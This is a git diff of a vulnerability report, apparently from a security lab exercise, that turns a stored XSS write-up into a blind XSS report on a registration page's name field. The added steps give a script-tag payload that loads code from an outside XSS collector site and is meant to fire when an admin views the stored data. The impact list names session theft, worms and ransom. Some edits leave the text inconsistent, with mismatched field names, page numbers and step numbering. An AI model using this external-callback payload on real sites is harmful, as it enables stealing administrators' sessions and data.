@@ -1,43 +1,44 @@
 ## Title
 
-# Stored Cross-Site Scripting (XSS) via Report Name Field in Network Reports
+# Blind Cross-Site Scripting (XSS) via Register Page Name Field 
+
 
 ## Vulnerability Type
 
 Stored XSS
 
 ## Summary : 
-The "Report Name" input field in the Network Reports section does not sanitize or encode user-supplied input before storing it in the database and later rendering it back to users. This means any JavaScript payload entered as a report name gets saved and then executed in the browser of every authenticated user who visits the Reports page — not just the attacker.
+The "Full name" input field in the Create New Account  section does not sanitize or encode user-supplied input before storing it in the database and later rendering it back to users. This means any JavaScript payload entered as a report name gets saved and then executed in the browser of every authenticated user who visits the Reports page — not just the attacker.
 
 ## Vulnerable Endpoint
-http://kzlabs.com/60.php
+http://kzlabs.com/63.php
 
-Vulnerable Parameter: Report Name field (input field inside the "New Network Report" form)
 
 ## Steps to Reproduce : 
 
-1. Log in to the application at `https://kzlabs.com/60.php` with a valid account.
-2. Navigate to the Reports tab.
-3. Click on + New Network Report.
-4. In the Report Name field, enter the following payload: `<img src=x onerror="alert(1)" onclick="confirm(1)" onmouseover="prompt(1)">`
-5. Fill in the remaining required fields (Network, Date Range, etc.) and submit the form.
-6. Once the report is saved, you are redirected back to the Network Reports listing page.
-7. Observe that a JavaScript alert box pops up displaying `1` — confirming that the script executed.
-8. Every authenticated user who loads this page will trigger the same alert.
+1. Register for New Account at `https://kzlabs.com/60.php`.
+4. In the Full Name field and Company Name enter the following payload: `'"><script src=https://xss.report/c/xamoo></script>` ( Note payload is taken from website : https://xss.report/ . Notes create account here and take any payload from XSS Payload Section . then add it here implace of my payload because xss result will appear in XSS report section in this website)
+5. Fill in the remaining required fields (Email, Password, etc.) and Create a New Account.
+6. Once the Account is Created, When a admin View thee page where the payload is stored / Account data is store . 
+7. Check https://xss.report/ website , check Xss report section You will get every detail.
+   
 
 ## Payload Used
 
-```<img src=x onerror="alert(1)" onclick="confirm(1)" onmouseover="prompt(1)">```
+```'"><script src=https://xss.report/c/xamoo></script>```
 
 ## Proof of Concept Request
   ```Screenshot 1``` — The Reports listing page showing the raw script payload stored as-is in row #7 under "Created By" as `<script>alert(1)</script>`, meaning the app saved it exactly as typed with no filtering at all.
-<img width="1920" height="1080" alt="Screenshot From 2026-05-24 14-56-47" src="https://github.com/user-attachments/assets/8406544b-c741-443d-8f05-fd263ac0f994" />
+  <img width="1920" height="1080" alt="Screenshot From 2026-05-24 22-06-28" src="https://github.com/user-attachments/assets/72b17955-30e1-46f4-8568-1dd9a25a70ef" />
+
 
 
 
 
  ```Screenshot 2 : ``` Used an img tag payload `'"><img src=x onerror=a>lert(1)` this time and the alert still triggered on page load, which confirms it's not just script tags that work here. Any HTML payload gets executed.
- <img width="1920" height="1080" alt="Screenshot From 2026-05-24 14-56-55" src="https://github.com/user-attachments/assets/a5da1975-d2b8-4698-bf98-d7bf6505ecf5" />
+
+ <img width="1920" height="1080" alt="Screenshot From 2026-05-24 22-12-45" src="https://github.com/user-attachments/assets/e4be7fb7-f9c0-42ef-a3c3-9a9ce011bd53" />
+
 
 
  
@@ -48,10 +49,12 @@ Vulnerable Parameter: Report Name field (input field inside the "New Network Rep
  
  An attacker can perform the following actions using this vulnerability:
  
-- Steal session cookies of every user who visits the page
-- Admins are affected too since they visit the same page
-- Can inject fake login forms to harvest credentials
-- One submission hits every authenticated user
+ - Full account takeover without user interaction — hijack session, reset password, or link attacker’s OAuth
+ - Execute silent CSRF attacks — change email, add admin, transfer funds, or modify settings in the background
+ - Turn the page into a persistent drive-by download — infect visitors with malware or keyloggers
+ - Leak entire backend data — read internal files, API responses, or database dumps via internal fetch
+ - Deploy a self-spreading worm — each compromised user automatically attacks their own session and propagates
+ - Ransom every admin — lock critical functions (e.g., disable admin panel, delete logs) until payment
   
 ## Recommendations for fix:
 
